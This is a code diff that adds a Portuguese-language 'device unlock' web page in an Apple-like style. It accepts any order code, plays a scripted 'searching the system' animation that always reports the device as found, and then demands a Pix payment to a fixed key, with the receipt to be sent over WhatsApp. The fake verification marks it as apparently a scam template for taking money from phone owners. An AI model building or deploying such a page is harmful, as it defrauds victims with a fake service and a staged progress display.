@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Desbloqueio de Aparelho</title>
+    <style>
+        /* --- Estilo Base --- */
+        :root {
+            --bg-color: #f5f5f7;
+            --text-color: #1d1d1f;
+            --gray-text: #86868b;
+            --blue-color: #0071e3;
+            --blue-hover: #0077ed;
+            --green-color: #34c759;
+            --wa-green: #25D366; /* Verde Oficial do WhatsApp */
+            --wa-green-hover: #128C7E;
+            --box-bg: #ffffff;
+            --border-color: #d2d2d7;
+            --header-bg: rgba(0, 0, 0, 0.8);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* --- Cabeçalho Premium --- */
+        header {
+            background-color: var(--header-bg);
+            backdrop-filter: blur(10px); /* Efeito de vidro borrado */
+            -webkit-backdrop-filter: blur(10px);
+            color: white;
+            padding: 14px 20px;
+            text-align: center;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+
+        header nav a {
+            color: #f5f5f7;
+            text-decoration: none;
+            margin: 0 15px;
+            opacity: 0.8;
+            transition: opacity 0.3s;
+        }
+
+        header nav a:hover {
+            opacity: 1;
+        }
+
+        /* --- Área Principal --- */
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 80px 20px; /* Espaço para o cabeçalho fixo */
+        }
+
+        .container {
+            background-color: var(--box-bg);
+            padding: 40px;
+            border-radius: 18px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            min-height: 260px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        h2 {
+            font-weight: 600;
+            font-size: 24px;
+            letter-spacing: -0.022em;
+            margin-top: 0;
+            margin-bottom: 8px;
+        }
+
+        p {
+            color: var(--gray-text);
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 16px;
+            background-color: var(--bg-color);
+            border: 1px solid transparent;
+            border-radius: 12px;
+            font-size: 17px;
+            box-sizing: border-box;
+            color: var(--text-color);
+            transition: all 0.2s ease;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            background-color: var(--box-bg);
+            border-color: var(--blue-color);
+            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.2);
+        }
+
+        button {
+            background-color: var(--blue-color);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s, transform 0.1s;
+            margin-bottom: 10px;
+        }
+
+        button:active { transform: scale(0.97); }
+        button:hover { background-color: var(--blue-hover); }
+
+        .btn-whatsapp {
+            background-color: var(--wa-green);
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+        }
+
+        .btn-whatsapp:hover { background-color: var(--wa-green-hover); }
+
+        .aviso-whatsapp {
+            font-size: 13px;
+            color: var(--text-color);
+            background-color: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 15px;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        .erro {
+            color: #ff3b30;
+            font-size: 14px;
+            margin-top: -10px;
+            margin-bottom: 15px;
+            display: none;
+            font-weight: 500;
+        }
+
+        /* --- Estilos do Carregamento --- */
+        #secao-carregamento { display: none; }
+        
+        .spinner {
+            border: 3px solid var(--border-color);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: var(--gray-text);
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-mensagem {
+            font-size: 17px;
+            color: var(--text-color);
+            font-weight: 500;
+        }
+
+        /* --- Estilos do Pagamento --- */
+        #secao-pagamento { display: none; }
+        
+        .pix-box {
+            background-color: var(--bg-color);
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+
+        .chave-pix {
+            font-weight: 500;
+            color: var(--text-color);
+            word-break: break-all;
+            font-size: 15px;
+            margin-top: 5px;
+            user-select: all;
+        }
+
+        .voltar-link {
+            display: inline-block;
+            margin-top: 20px;
+            font-size: 14px;
+            color: var(--blue-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* --- Rodapé --- */
+        footer {
+            background-color: #f5f5f7;
+            color: var(--gray-text);
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            border-top: 1px solid var(--border-color);
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <nav>
+            <a href="#">Início</a>
+            <a href="#">Suporte</a>
+            <a href="#">Serviços</a>
+            <a href="#">Contato</a>
+        </nav>
+    </header>
+
+    <main>
+        <div class="container">
+            <div id="secao-codigo">
+                <h2>Insira o Código</h2>
+                <p>Digite a identificação do pedido para prosseguir com a liberação.</p>
+                <input type="text" id="input-codigo" placeholder="Ex: 12345ABC" autocomplete="off">
+                <div id="mensagem-erro" class="erro">Por favor, insira um código válido.</div>
+                <button onclick="verificarCodigo()">Buscar Aparelho</button>
+            </div>
+
+            <div id="secao-carregamento">
+                <div class="spinner"></div>
+                <div class="status-mensagem" id="status-texto">Encontrando aparelho...</div>
+            </div>
+
+            <div id="secao-pagamento">
+                <h2>Aparelho Encontrado</h2>
+                <p>Realize o pagamento via Pix para concluir a operação no sistema.</p>
+                
+                <div class="pix-box">
+                    <p style="margin: 0; font-size: 13px;">Chave Pix Copia e Cola:</p>
+                    <div class="chave-pix" id="texto-chave-pix">a5052757-5521-4aad-b746-be9b0d610931</div>
+                </div>
+
+                <button onclick="copiarPix()" id="btn-copiar">Copiar Chave Pix</button>
+                
+                <div class="aviso-whatsapp">
+                    ⚠️ Envie o comprovante de pagamento no WhatsApp do responsável pelo serviço.
+                </div>
+                
+                <button class="btn-whatsapp" onclick="abrirWhatsApp()">
+                    Enviar Comprovante
+                </button>
+                
+                <a href="#" class="voltar-link" onclick="voltar()">← Inserir outro código</a>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>Copyright © 2026 Serviços de Desbloqueio. Todos os direitos reservados.</p>
+        <p>Política de Privacidade | Termos de Uso</p>
+    </footer>
+
+    <script>
+        function verificarCodigo() {
+            const codigo = document.getElementById('input-codigo').value;
+            const msgErro = document.getElementById('mensagem-erro');
+
+            if (codigo.trim() === '') {
+                msgErro.style.display = 'block';
+            } else {
+                msgErro.style.display = 'none';
+                document.getElementById('secao-codigo').style.display = 'none';
+                document.getElementById('secao-carregamento').style.display = 'block';
+                iniciarAnimacao();
+            }
+        }
+
+        function iniciarAnimacao() {
+            const statusTexto = document.getElementById('status-texto');
+            
+            setTimeout(() => { statusTexto.innerText = 'Verificando sistema...'; }, 1500);
+            setTimeout(() => { statusTexto.innerText = 'Adicionando ao sistema...'; }, 3000);
+            setTimeout(() => { 
+                statusTexto.innerText = 'Aparelho encontrado!'; 
+                statusTexto.style.color = 'var(--green-color)'; 
+            }, 4500);
+            
+            setTimeout(() => {
+                document.getElementById('secao-carregamento').style.display = 'none';
+                document.getElementById('secao-pagamento').style.display = 'block';
+                statusTexto.innerText = 'Encontrando aparelho...';
+                statusTexto.style.color = 'var(--text-color)';
+            }, 5500); 
+        }
+
+        function copiarPix() {
+            const chavePix = document.getElementById('texto-chave-pix').innerText;
+            const btnCopiar = document.getElementById('btn-copiar');
+
+            const sucessoAoCopiar = () => {
+                btnCopiar.innerText = 'Copiado!';
+                btnCopiar.style.backgroundColor = 'var(--green-color)'; 
+                
+                setTimeout(() => {
+                    btnCopiar.innerText = 'Copiar Chave Pix';
+                    btnCopiar.style.backgroundColor = 'var(--blue-color)';
+                }, 3000);
+            };
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(chavePix).then(sucessoAoCopiar).catch(() => fallbackCopiar(chavePix, sucessoAoCopiar));
+            } else {
+                fallbackCopiar(chavePix, sucessoAoCopiar);
+            }
+        }
+
+        function fallbackCopiar(texto, callbackSucesso) {
+            const textArea = document.createElement("textarea");
+            textArea.value = texto;
+            textArea.style.position = "fixed";
+            textArea.style.opacity = "0";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+
+            try {
+                if (document.execCommand('copy')) callbackSucesso();
+            } catch (err) {}
+            document.body.removeChild(textArea);
+        }
+
+        function abrirWhatsApp() {
+            // Coloque o seu número de WhatsApp aqui, com o código do país (55) e o DDD.
+            // Exemplo: 5511999999999
+            const numeroWhatsApp = "5511999999999"; 
+            const mensagem = encodeURIComponent("Olá, acabei de realizar o Pix para a liberação do aparelho. Segue o comprovante:");
+            window.open(`https://wa.me/${numeroWhatsApp}?text=${mensagem}`, '_blank');
+        }
+
+        function voltar() {
+            document.getElementById('input-codigo').value = '';
+            document.getElementById('secao-pagamento').style.display = 'none';
+            document.getElementById('secao-carregamento').style.display = 'none';
+            document.getElementById('secao-codigo').style.display = 'block';
+        }
+    </script>
+
+</body>
+</html>
